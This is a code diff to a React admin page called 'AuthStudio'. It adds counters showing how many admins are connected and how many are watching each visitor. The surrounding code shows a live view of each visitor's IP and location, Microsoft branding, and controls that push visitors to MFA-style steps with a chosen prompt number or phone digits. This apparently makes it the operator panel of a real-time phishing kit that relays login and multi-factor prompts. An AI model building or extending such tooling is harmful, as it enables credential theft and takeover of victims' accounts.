@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu, Copy, Shield, AlertCircle } from 'lucide-react';
+import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu, Copy, Shield, AlertCircle, Users } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -312,12 +312,14 @@ function VisitorModal({
   onPushAction,
   onDeleteField,
   onDeleteAll,
+  watcherCount = 0,
 }: {
   visitor: VisitorInfo;
   onClose: () => void;
   onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => void;
   onDeleteField: (visitorId: string, field: string) => void;
   onDeleteAll: (visitorId: string) => void;
+  watcherCount?: number;
 }) {
   const [iframeLoaded, setIframeLoaded] = useState(false);
   const [promptDialogOpen, setPromptDialogOpen] = useState(false);
@@ -391,6 +393,12 @@ function VisitorModal({
             </div>
             <span className="text-white font-semibold text-[13px] sm:text-[14px] flex-shrink-0">Live View</span>
             <span className="text-[10px] font-semibold px-2 py-0.5 rounded text-white flex-shrink-0" style={{ backgroundColor: stepColor }}>{stepLabel}</span>
+            {watcherCount > 1 && (
+              <span className="flex items-center gap-1 text-[10px] font-semibold text-indigo-300 bg-indigo-500/20 border border-indigo-500/30 px-2 py-0.5 rounded leading-none flex-shrink-0">
+                <Users className="w-3 h-3" />
+                {watcherCount} admins here
+              </span>
+            )}
             <span className="text-[11px] text-[#8a919e] truncate hidden sm:block">{visitor.location.flag} {visitor.location.city}, {visitor.location.country}</span>
             <span className="text-[10px] font-mono text-[#555d6b] flex-shrink-0 hidden lg:block">{visitor.ip}</span>
             <span className="hidden md:flex items-center gap-1 text-[10px] text-[#555d6b] bg-[#1e2128] rounded px-2 py-0.5 flex-shrink-0">
@@ -756,6 +764,8 @@ export default function AdminPage() {
   const [gCorrectNumber, setGCorrectNumber] = useState(45);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
+  const [adminCount, setAdminCount] = useState(1);
+  const [visitorWatchers, setVisitorWatchers] = useState<Record<string, number>>({});
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
   const wsRef = useRef<WebSocket | null>(null);
@@ -879,6 +889,11 @@ export default function AdminPage() {
           } else if (msg.type === 'visitor-deleted' && msg.id) {
             setVisitors(prev => prev.filter(v => v.id !== msg.id));
             setModalVisitorIp(prev => { const v = visitors.find(x => x.id === msg.id); return prev === (v?.ip ?? msg.id) ? null : prev; });
+          } else if (msg.type === 'admin-count') {
+            setAdminCount((msg as unknown as { count: number }).count);
+          } else if (msg.type === 'visitor-watchers') {
+            const { visitorId, count } = msg as unknown as { visitorId: string; count: number };
+            setVisitorWatchers(prev => ({ ...prev, [visitorId]: count }));
           }
         } catch { /* ignore */ }
       };
@@ -886,6 +901,16 @@ export default function AdminPage() {
 
     return () => { try { ws?.close(); } catch { /* ignore */ } };
   }, [authState]);
+
+  const openModal = (ip: string) => {
+    const v = visitors.find(x => x.ip === ip);
+    if (v) wsRef.current?.send(JSON.stringify({ type: 'watch-visitor', visitorId: v.id }));
+    setModalVisitorIp(ip);
+  };
+  const closeModal = () => {
+    wsRef.current?.send(JSON.stringify({ type: 'watch-visitor', visitorId: null }));
+    setModalVisitorIp(null);
+  };
 
   const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
     const ws = wsRef.current;
@@ -1042,9 +1067,10 @@ export default function AdminPage() {
       {modalVisitor && (
         <VisitorModal
           visitor={modalVisitor}
-          onClose={() => setModalVisitorIp(null)}
+          onClose={() => closeModal()}
           onPushAction={pushAction}
           onDeleteField={deleteField}
+          watcherCount={visitorWatchers[modalVisitor.id] ?? 0}
           onDeleteAll={deleteAll}
         />
       )}
@@ -1065,8 +1091,12 @@ export default function AdminPage() {
             <Key className="w-3.5 h-3.5 text-white" />
           </div>
           <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
+          <div className="ml-auto flex items-center gap-1.5 flex-shrink-0">
+            <Users className="w-3 h-3 text-[#555d6b]" />
+            <span className="text-[11px] font-semibold text-[#8a919e]">{adminCount}</span>
+          </div>
           {isMobileAdmin && (
-            <button onClick={() => setSidebarOpen(false)} className="ml-auto p-1.5 rounded-lg text-[#8a919e] hover:text-white hover:bg-[#2d3139] transition-colors">
+            <button onClick={() => setSidebarOpen(false)} className="p-1.5 rounded-lg text-[#8a919e] hover:text-white hover:bg-[#2d3139] transition-colors">
               <X className="w-4 h-4" />
             </button>
           )}
@@ -1316,7 +1346,7 @@ export default function AdminPage() {
                         ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
                         : 'border-[#1e2128] bg-[#13151a] opacity-60'
                       }`}
-                    onClick={() => setModalVisitorIp(v.ip)}
+                    onClick={() => openModal(v.ip)}
                   >
                     {/* Card header */}
                     <div className="flex items-start gap-3 px-4 pt-4 pb-3">
@@ -1332,6 +1362,12 @@ export default function AdminPage() {
                           <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: vStepColor }}>
                             {vStepLabel}
                           </span>
+                          {(visitorWatchers[v.id] ?? 0) > 0 && (
+                            <span className="flex items-center gap-1 text-[10px] font-semibold text-indigo-300 bg-indigo-500/20 border border-indigo-500/30 px-1.5 py-0.5 rounded leading-none flex-shrink-0">
+                              <Eye className="w-2.5 h-2.5" />
+                              {visitorWatchers[v.id]}
+                            </span>
+                          )}
                         </div>
                         <div className="text-[11px] text-[#8a919e] mt-1">{v.location.flag} {v.location.city}, {v.location.country}</div>
                         <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} · {vUA.os}</div>
@@ -1373,7 +1409,7 @@ export default function AdminPage() {
                     {/* Footer actions */}
                     <div className="px-4 pb-4 mt-auto flex gap-2" onClick={e => e.stopPropagation()}>
                       <button
-                        onClick={() => setModalVisitorIp(v.ip)}
+                        onClick={() => openModal(v.ip)}
                         className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors text-[12px] font-medium"
                       >
                         <Eye className="w-3.5 h-3.5" />
